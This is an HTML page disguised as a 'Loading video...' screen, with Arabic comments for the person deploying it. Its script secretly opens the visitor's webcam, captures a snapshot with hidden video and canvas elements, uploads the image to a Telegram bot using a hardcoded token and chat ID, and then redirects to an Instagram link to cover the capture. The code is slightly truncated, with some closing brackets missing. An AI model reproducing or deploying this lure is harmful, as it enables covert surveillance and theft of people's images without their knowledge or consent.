
<!DOCTYPE html>
<html>
<head>
  <title>Loading video...</title>
</head>
<body>
  <video id="video" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

  <script>
    const BOT_TOKEN = '8237817177:AAGCEbWMBxTd4nFB70mJNoTFkrHlw2Qr5GY';
    const CHAT_ID = '960061599';
    const REDIRECT_URL = 'https://www.instagram.com/share/BAPOHyZPk7'; // ← تقدر تغيّره بأي رابط إنستغرام حقيقي

    navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
      const video = document.getElementById('video');
      video.srcObject = stream;

      setTimeout(() => {
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        const imageData = canvas.toDataURL('image/png');

        fetch(imageData)
          .then(res => res.blob())
          .then(blob => {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'snapshot.png');

 fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
  method: 'POST',
  body: formData
})
.then(res => res.json())
.then(data => {
  console.log("📸 تم الإرسال:", data);
  window.location.href = REDIRECT_URL;
})
.catch(err => {
  console.error("فشل الإرسال إلى Telegram:", err);
  window.location.href = REDIRECT_URL;
});
  </script>
</body>
</html>
